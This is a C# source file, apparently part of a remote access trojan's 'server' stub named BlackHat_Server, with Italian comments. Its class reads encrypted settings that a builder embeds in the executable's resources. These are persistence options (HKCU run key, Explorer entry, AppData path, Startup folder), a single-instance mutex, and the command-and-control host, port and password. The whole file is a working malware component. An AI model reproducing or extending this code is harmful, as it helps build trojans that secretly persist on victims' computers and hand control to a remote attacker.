using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace BlackHat_Server
{
    class ResUtile
    {
        //PINVOKE
        [DllImport("kernel32", CharSet = CharSet.Unicode)]
        private static extern IntPtr BeginUpdateResource(String pFileName, bool
        bDeleteExistingResources);

        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool UpdateResource(IntPtr hUpdate,
        System.Text.StringBuilder lpType, System.Text.StringBuilder lpName, int
        wLanguage, Byte[] lpData, int cbData);

        [DllImport("kernel32", SetLastError = true)]
        private static extern int EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        //PINVOKE

        // LOAD PINVOKE
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("Kernel32.dll", EntryPoint = "LockResource")]
        private static extern IntPtr LockResource(IntPtr hGlobal);

        //  [DllImport("kernel32.dll")]
        //  static extern IntPtr FindResource(IntPtr hModule, int lpID, string lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

        // AGGIUNTA IO !!
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        // LOAD PINVOKE




        /// <summary>
        /// Extract string from Res
        /// </summary>
        /// <param name="filename"></param>
        /// <param name="outfile"></param>
        private string GetResString(string filename, string nomeRisorsa)
        {
            try
            {
                IntPtr hMod = LoadLibraryEx(@filename, IntPtr.Zero, 0x00000002);

                IntPtr hRes = FindResource(hMod, nomeRisorsa, "FILE INFO");
                uint size = SizeofResource(hMod, hRes);
                IntPtr pt = LoadResource(hMod, hRes);

                byte[] bPtr = new byte[size];
                Marshal.Copy(pt, bPtr, 0, (int)size);

                System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                string str = enc.GetString(bPtr);

                return (str);
            }
            catch 
            {
                return null;
            }
            
           

        }
        //************************************************************

      



        //*************************************************************

        #region PUBLIC

        /// <summary>
        /// Recupera le info di installazione
        /// </summary>
        /// <param name="useHKCU"></param>
        /// <param name="useExplorer"></param>
        /// <param name="appDataPath"></param>
        /// <param name="useStartup"></param>
        /// <param name="startUpFileName"></param>
        public bool GetInstallInfo(out bool useHKCU, out bool useExplorer, out string appDataPath, out bool useStartup, out string startUpFileName,
                                    out string hkcuEntry, out string exploEntry)
        {
            try
            {
                string info = GetResString(Application.ExecutablePath, "IS");

                Text_Des td = new Text_Des();

                info = td.Decrypt(info, true);

                // PARSING DELLE INFO
                string[] parsed = info.Split('|');
                                

                useHKCU = bool.Parse(parsed[0]);
                hkcuEntry = parsed[1];
                useExplorer = bool.Parse(parsed[2]);
                exploEntry = parsed[3];
                appDataPath = parsed[4];
                useStartup = bool.Parse(parsed[5]);
                startUpFileName = parsed[6];


                return true;
            }
            catch
            {
                useHKCU = false;
                useExplorer = false;
                appDataPath =null;
                useStartup = false;
                startUpFileName = null;
                hkcuEntry = null;
                exploEntry = null;

                return false;
            }
        }



        /// <summary>
        /// Recupera il MUTEX
        /// Res Name = MTX
        /// Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetServerMutex()
        {
            try
            {
                string name = GetResString(Application.ExecutablePath, "MTX");

                Text_Des td = new Text_Des();

                name = td.Decrypt(name, true);

                return name;
            }
            catch
            {
                return null;
            }



        }
        //-------------------------------------

        /// <summary>
        /// Recupera il nome del server
        /// Res Name = SN
        /// Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetServerName()
        {
            try
            {
                string name = GetResString(Application.ExecutablePath, "SN");

                Text_Des td = new Text_Des();

                name = td.Decrypt(name, true);

                return name;
            }
            catch
            {
                return null;
            }
           

           
        }
        //-------------------------------------


       

        /// <summary>
        /// Recupera l'host dalle risorse
        /// Res Name = H
        /// Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetHost()
        {
            try
            {
                string host = GetResString(Application.ExecutablePath, "H");

                Text_Des td = new Text_Des();

                host = td.Decrypt(host, true);

                return host;
            }
            catch 
            {
                return null;
            }
          
        }
        //-------------------------------------

        /// <summary>
        /// Recupera password dalle risorse
        /// Res Name = PS
        /// Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetPsw()
        {
            try
            {
                string psw = GetResString(Application.ExecutablePath, "PS");

                Text_Des td = new Text_Des();

                psw = td.Decrypt(psw, true);

                return psw;
            }
            catch 
            {
                return null;
            }
           
        }
        //-------------------------------------

        /// <summary>
        /// Recupera Porta dalle risorse
        /// Res Name = PP
        /// -1 in caso di errore
        /// </summary>
        /// <returns></returns>
        public int GetPort()
        {
            try
            {
                string port = GetResString(Application.ExecutablePath, "PP");

                Text_Des td = new Text_Des();

                port = td.Decrypt(port, true);

                int iPort;

                bool isInt = int.TryParse(port, out iPort);

                if (isInt)
                    return iPort;
                else
                    return -1;
            
            }
            catch 
            {
                return -1;
            }
           
        }
        //-------------------------------------

        #endregion




    }
}
